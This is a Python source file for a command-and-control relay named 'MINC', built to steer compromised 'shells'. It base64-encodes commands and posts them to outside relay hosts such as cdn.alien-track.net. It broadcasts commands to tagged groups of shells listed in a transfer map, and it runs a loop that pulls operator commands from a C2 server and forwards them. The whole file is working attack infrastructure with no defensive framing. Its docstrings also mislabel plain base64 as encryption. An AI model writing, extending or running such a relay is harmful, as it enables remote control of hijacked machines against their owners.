# MINC - C2 Relay Engine for Aggressive or Chained Shells

import base64
import json
import random
import requests
import logging
import time

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

RELAY_API = "http://cdn.alien-track.net/relay.php"  # Default API endpoint
FALLBACK_RELAY_API = "http://backup.relay-server.net/relay.php"  # Example of a fallback relay endpoint
RETRY_DELAY = 5  # Retry delay in seconds
MAX_RETRIES = 3  # Maximum number of retries before giving up

def encrypt_command(command, shell_id):
    """
    Encrypt the command to be sent to the shell with a nonce for added security.
    
    :param command: The command to encrypt.
    :param shell_id: The target shell's unique ID.
    :return: The base64-encoded encrypted command payload.
    """
    payload = {
        "cmd": command,
        "to": shell_id,
        "nonce": random.randint(100000, 999999)
    }
    blob = json.dumps(payload).encode()
    encrypted = base64.b64encode(blob).decode()
    return encrypted


def send_command_relay(shell_id, command, retry_count=0):
    """
    Send an encrypted command to a specific shell through the C2 relay API.
    
    :param shell_id: The target shell's unique ID.
    :param command: The command to execute on the shell.
    :param retry_count: The current retry attempt count.
    :return: True if the command was successfully sent, False otherwise.
    """
    encrypted = encrypt_command(command, shell_id)
    
    try:
        logger.info(f"Sending command to shell {shell_id}: {command}")
        response = requests.post(RELAY_API, data={"relay": encrypted}, timeout=3)
        
        if response.status_code == 200:
            logger.info(f"Command successfully sent to shell {shell_id}")
            return True
        else:
            logger.error(f"Failed to send command to shell {shell_id}, status code {response.status_code}")
            return False
    except requests.RequestException as e:
        logger.error(f"Error sending command to shell {shell_id}: {e}")
        if retry_count < MAX_RETRIES:
            logger.info(f"Retrying command to shell {shell_id} ({retry_count + 1}/{MAX_RETRIES})...")
            time.sleep(RETRY_DELAY)
            return send_command_relay(shell_id, command, retry_count + 1)
        else:
            logger.error(f"Max retries reached for shell {shell_id}. Giving up.")
            return False


def broadcast_to_tag(tag, command):
    """
    Broadcast a command to all shells that match the specified tag.
    
    :param tag: The tag to filter shells by.
    :param command: The command to broadcast to matching shells.
    """
    logger.info(f"Broadcasting command to tag: {tag}")
    try:
        with open("output/transfer_map.json", "r") as f:
            shells = json.load(f)
        for shell_id, meta in shells.items():
            if tag in meta.get("profile", {}).get("tags", []):
                if not send_command_relay(shell_id, command):
                    logger.warning(f"Failed to send command to shell {shell_id} with tag {tag}")
    except (FileNotFoundError, json.JSONDecodeError) as e:
        logger.error(f"Error loading shell map: {e}")


def relay_listener():
    """
    Relay listener pulls commands from a central server (or local queue) to execute on shells.
    This is a simple example of a long-running process that checks for new commands.
    It could be expanded to work with websockets, MQTT, or any other real-time communication method.
    """
    logger.info("Starting relay listener...")
    while True:
        try:
            # Simulated command pull, can be replaced by real-time methods like websockets
            response = requests.get("http://your-c2-server.net/command-pull", timeout=5)
            if response.status_code == 200:
                command_data = response.json()
                shell_id = command_data.get("shell_id")
                command = command_data.get("command")
                if shell_id and command:
                    logger.info(f"Received command: {command} for shell {shell_id}")
                    send_command_relay(shell_id, command)
            else:
                logger.warning(f"Failed to pull command from C2 server, status code: {response.status_code}")
        except requests.RequestException as e:
            logger.error(f"Error pulling command: {e}")
            time.sleep(RETRY_DELAY)


def test_relay():
    """
    Test the relay functionality by sending a test command to a shell.
    """
    test_shell_id = "test_shell_001"
    test_command = "whoami"
    success = send_command_relay(test_shell_id, test_command)
    if success:
        logger.info("Test command sent successfully.")
    else:
        logger.error("Test command failed.")


if __name__ == "__main__":
    # Run the test relay function (just to verify functionality)
    test_relay()

    # Start the relay listener in the background (you could also implement threading for this)
    relay_listener()

